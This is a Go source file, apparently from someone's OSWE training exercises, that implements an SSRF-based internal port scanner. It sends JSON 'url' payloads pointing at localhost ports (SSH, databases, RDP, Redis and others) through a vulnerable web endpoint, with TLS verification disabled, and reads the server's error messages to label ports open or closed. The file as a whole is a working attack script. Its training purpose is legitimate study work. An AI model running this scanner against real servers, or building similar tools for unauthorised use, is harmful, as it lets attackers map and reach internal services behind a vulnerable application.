package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"github.com/iPhantasmic/OSWE/scripts/utils"
	"log"
	"net/http"
	"os"
	"strings"
	"time"
)

// Ex 12.4.4.1 - SSRF port scanner

var ports = []int{22, 80, 443, 1433, 1521, 3306, 3389, 5000, 5432, 5900, 6379, 8000, 8001, 8055, 8080, 8443, 9000}

func main() {
	var tr *http.Transport

	debug := flag.Bool("debug", false, "debug mode")
	target := flag.String("target", "", "target host/ip")
	timeout := flag.Int("timeout", 3, "timeout")
	ssrf := flag.String("ssrf", "", "ssrf target")

	// parse args
	flag.Parse()
	args := os.Args[:]
	log.Println("Args: ", args)

	if len(args) < 4 {
		utils.PrintFailure(fmt.Sprintf("usage: %s --target=<URL> --ssrf=<wordlist> [--timeout=<actionlist>]", os.Args[0]))
		utils.PrintFailure(fmt.Sprintf("eg: %s --target=http://192.168.249.135:8000 --ssrf=http://localhost --timeout=5", os.Args[0]))
		os.Exit(1)
	}

	tr = &http.Transport{
		TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
		DisableCompression: true, // to ensure that we can obtain Content-Length response header
	}

	// create our HTTP client using the above transport and set the global variable
	client := &http.Client{
		Transport: tr,
		Timeout:   time.Duration(*timeout) * time.Second,
	}

	for _, port := range ports {
		jsonBody := []byte(fmt.Sprintf("{\"url\":\"%s:%d\"}", *ssrf, port))

		resp := utils.SendPostRequest(client, *debug, *target, utils.PostRequest{
			ContentType: "json",
			JsonData:    jsonBody,
		})

		if strings.Contains(resp.ResponseBody, "You don't have permission to access this.") {
			fmt.Printf("%d \t OPEN - returned permission error, therefore valid resource\n", port)
		} else if strings.Contains(resp.ResponseBody, "ECONNREFUSED") {
			fmt.Printf("%d \t CLOSED\n", port)
		} else if strings.Contains(resp.ResponseBody, "Request failed with status code 404") {
			fmt.Printf("%d \t OPENED - returned 404\n", port)
		} else if strings.Contains(resp.ResponseBody, "Parse Error:") {
			fmt.Printf("%d \t ???? - returned parse error, potentially open non-http", port)
		} else if strings.Contains(resp.ResponseBody, "socket hang up") {
			fmt.Printf("%d \t OPEN - socket hang up, likely non-http", port)
		} else {
			fmt.Printf("%d \t %s", port, resp.ResponseBody)
		}
	}

	fmt.Println("")
	utils.PrintSuccess("Done!")
}
